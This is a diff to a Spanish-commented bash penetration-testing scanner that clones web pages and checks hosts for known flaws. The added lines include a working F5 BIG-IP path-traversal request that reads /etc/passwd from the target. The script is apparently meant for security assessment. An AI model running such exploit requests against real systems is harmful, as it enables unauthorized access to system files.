@@ -9,7 +9,7 @@
 # Identificar redes con  http://www.ip-calc.com/
 # https://github.com/Exploit-install/Routerhunter-2.0
 # Sacar herramientas de https://github.com/1N3/Sn1per https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest https://github.com/skavngr/rapidscan
-# sslscan -h
+# curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40  https://$subdominio > webClone/https-$subdominio.html
 ##
 
 #bash-obfuscate lanscanner_original.sh -o lanscanner.sh
@@ -1821,9 +1821,7 @@ then
 					for subdominio in $lista_subdominios; do													
 						echo -e "\t[+] subdominio: $subdominio"							
 						#wget --timeout=20 --tries=1 http://$subdominio -O webClone/http-$subdominio.html
-						curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40 http://$subdominio > webClone/http-$subdominio.html
-						
-						
+						curl.pl --url  http://$subdominio > webClone/http-$subdominio.html												
     
 						sed -i "s/\/index.php//g" webClone/http-$subdominio.html
 						sed -i "s/https/http/g" webClone/http-$subdominio.html						
@@ -2064,7 +2062,7 @@ then
 								egrep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt > .vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
 								
 							fi
-							###################################
+							##################################		
 							
 							
 							#######  OWA (domain) ######
@@ -2153,7 +2151,7 @@ then
 				#################  Realizar el escaneo por IP  ##############	
 				echo -e "\t[+]Escaneo solo por IP (http) $ip:$port"
 				#wget --timeout=20 --tries=1 --no-check-certificate  http://$ip -O webClone/http-$ip.html
-				curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40 http://$ip > webClone/http-$ip.html
+				curl.pl --url  http://$ip > webClone/http-$ip.html
 				sed -i "s/\/index.php//g" webClone/http-$ip.html
 				sed -i "s/https/http/g" webClone/http-$ip.html				 			
 				sed -i "s/www.//g" webClone/http-$ip.html	# En el caso de que www.dominio.com sae igual a dominio.com		
@@ -2550,7 +2548,7 @@ then
 						echo -e "\t[+] subdominio: $subdominio"	
 																		
 						#wget --timeout=20 --tries=1 --no-check-certificate  https://$subdominio -O webClone/https-$subdominio.html
-						curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40 https://$subdominio > webClone/https-$subdominio.html
+						curl.pl --url  https://$subdominio > webClone/https-$subdominio.html
 						sed -i "s/\/index.php//g" webClone/https-$subdominio.html 2>/dev/null
 						sed -i "s/https/http/g" webClone/https-$subdominio.html 2>/dev/null		
 						sed -i "s/www.//g" webClone/https-$subdominio.html 2>/dev/null # borrar subdominio www.dominio.com						
@@ -2743,6 +2741,20 @@ then
 							###################################	
 							
 							
+							#######  BIG-IP F5 (domain) ######
+							grep -qi "BIG-IP" .enumeracion/"$subdominio"_"$port"_webData.txt
+							greprc=$?
+							if [[ $greprc -eq 0 ]];then 		
+								wpscan  --update >/dev/null 						
+								echo -e "\t\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($subdominio)"
+								
+								curl --path-as-is -s -k "https://$subdominio/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_bigIPVul.txt
+								egrep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_bigIPVul.txt > .vulnerabilidades/"$subdominio"_"$port"_bigIPVul.txt
+								
+							fi
+							###################################
+							
+							
 							#######  OWA (domain) ######
 							grep -qi Outlook .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
@@ -2830,7 +2842,7 @@ then
 				############### Escaneo por IP ############
 				echo -e "[+]\tEscaneo solo por IP (https) $ip:$port"
 				#wget --timeout=20 --tries=1 --no-check-certificate  https://$ip -O webClone/https-$ip.html
-				curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40 https://$ip > webClone/https-$ip.html
+				curl.pl --url  https://$ip > webClone/https-$ip.html
 				sed -i "s/\/index.php//g" webClone/https-$ip.html 2>/dev/null
 				sed -i "s/https/http/g" webClone/https-$ip.html 2>/dev/null				
 				sed -i "s/www.//g" webClone/https-$ip.html 2>/dev/null # 
@@ -2917,6 +2929,20 @@ then
 								
 					fi
 					###################################		
+					
+					
+					#######  BIG-IP F5 (domain) ######
+					grep -qi "BIG-IP" .enumeracion/"$ip"_"$port"_webData.txt
+					greprc=$?
+					if [[ $greprc -eq 0 ]];then 		
+						wpscan  --update >/dev/null 						
+						echo -e "\t\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($ip)"
+						
+						curl --path-as-is -s -k "https://$ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_bigIPVul.txt
+						egrep --color=never ":x:" logs/vulnerabilidades/"$ip"_"$port"_bigIPVul.txt > .vulnerabilidades/"$ip"_"$port"_bigIPVul.txt
+						
+					fi
+					###################################
 					
 					
 					#######  OWA (ip) ######
